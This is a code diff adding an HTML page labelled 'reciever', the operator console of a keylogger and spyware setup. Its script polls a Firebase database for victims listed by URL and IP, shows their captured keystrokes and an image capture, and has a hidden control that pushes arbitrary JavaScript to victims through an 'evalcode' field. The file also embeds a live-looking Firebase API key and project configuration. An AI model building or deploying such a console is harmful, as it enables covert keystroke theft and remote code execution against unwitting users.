@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reciever</title>
+    <style>
+        .keylogger{
+            border: 1px solid;
+            
+        }
+        body{
+            font-size:x-large;
+            font-family:sans-serif;
+        }
+        .di{
+            margin-left: 30px;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+   <div class="keylogger"><span>KEYLOGGER:</span><span id="keylogger"></span></div> 
+   URL:<input type="text" id="url"></input><br>IP:<input type="text" id="ip"></input><br>
+   <div style='display:none'>JS:<input type="text" id="exec"></input><button id="btnexe">EXECUTE</button><br></div><!--NE MARCHE PAS-->
+   
+   DATA:<span id="json"></span><br>
+<img src="" id="output">
+
+
+
+
+
+        <script src="https://www.gstatic.com/firebasejs/8.2.10/firebase-app.js"></script>
+      
+        <script src="https://www.gstatic.com/firebasejs/8.2.10/firebase-analytics.js"></script>
+      
+        <script src="https://www.gstatic.com/firebasejs/8.2.10/firebase-auth.js"></script>
+        <script src="https://www.gstatic.com/firebasejs/8.2.10/firebase-firestore.js"></script>
+        <script src="https://www.gstatic.com/firebasejs/8.2.10/firebase-database.js"></script>
+
+
+
+   <script>
+       var id;
+var firebaseConfig = {
+apiKey: "AIzaSyBYiYslg75xe7QxnCSqQxM9AbFU9T1QQ6A",
+  authDomain: "mouarf-15754.firebaseapp.com",
+  databaseURL: "https://mouarf-15754-default-rtdb.europe-west1.firebasedatabase.app/",
+  projectId: "mouarf-15754",
+  storageBucket: "mouarf-15754.appspot.com",
+  messagingSenderId: "401925401903",
+  appId: "1:401925401903:web:63634c8f5f92f5ec8405da"
+  };
+  firebase.initializeApp(firebaseConfig);
+  firebase.analytics();
+  var database = firebase.database();
+var data;
+  setInterval(()=>{
+     
+      database.ref().on('value',(snapshot)=>{
+          data = snapshot.val();
+          //console.log(data);
+          document.getElementById('json').innerHTML = null;
+    for (var property in data) {
+        var div = document.createElement("div");
+        var da = document.createElement("div");
+        da.innerHTML = property;
+        da.onclick = function(){document.getElementById('url').value = this.innerText};
+        document.getElementById('json').appendChild(div);
+        div.appendChild(da);
+    
+        for (var propert in data[property]) {
+            var di = document.createElement("div");
+            di.innerHTML = propert;
+        di.onclick = function(){document.getElementById('ip').value = this.innerText};
+        di.classList = 'di';
+            div.appendChild(di);
+            for (var proper in data[propert]) {
+            var dis = document.createElement("div");
+            dis.innerHTML = proper;
+        dis.onclick = function(){document.getElementById('ip').value = this.innerText};
+        dis.classList = 'dis';
+            div.appendChild(dis);
+        }
+        }
+  }
+  try{
+document.getElementById('output').src = data[document.getElementById('url').value][document.getElementById('ip').value]['data'];
+document.getElementById('keylogger').innerHTML = data[document.getElementById('url').value][document.getElementById('ip').value]['key'];
+id = document.getElementById('url').value +'/' + document.getElementById('ip').value;
+}
+catch(e){console.log(e.message)}
+      });
+
+  },700);
+
+
+
+
+$('#btnexe').on('click',function(){
+     
+ database.ref(id + '/evalcode').set(document.getElementById('exec').value);
+ 
+});
+
+
+
+
+
+   </script>
+</body>
+</html>
